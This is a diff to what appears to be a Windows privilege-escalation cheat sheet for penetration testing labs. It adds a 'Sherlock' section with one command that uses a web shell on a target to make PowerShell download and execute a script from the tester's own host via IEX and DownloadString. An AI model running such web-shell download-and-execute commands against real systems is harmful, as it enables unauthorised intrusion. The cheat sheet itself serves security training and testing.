@@ -10,6 +10,12 @@ windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp
 The output shows either public exploits (E), or Metasploit modules (M) as indicated by the character value
 ```
 
+## Sherlock
+
+```
+view-source:10.10.10.X/shell.php?cmd=echo IEX (New-Object Net.WebClient).DownloadString("http://YourIP:8000/Sherlock.ps1"); | powershell -noprofile -
+```
+
 ## Basic Enumeration of the System
 
 Before we start looking for privilege escalation opportunities we need to understand a bit about the machine. We need to know what users have privileges. What patches/hotfixes the system has.
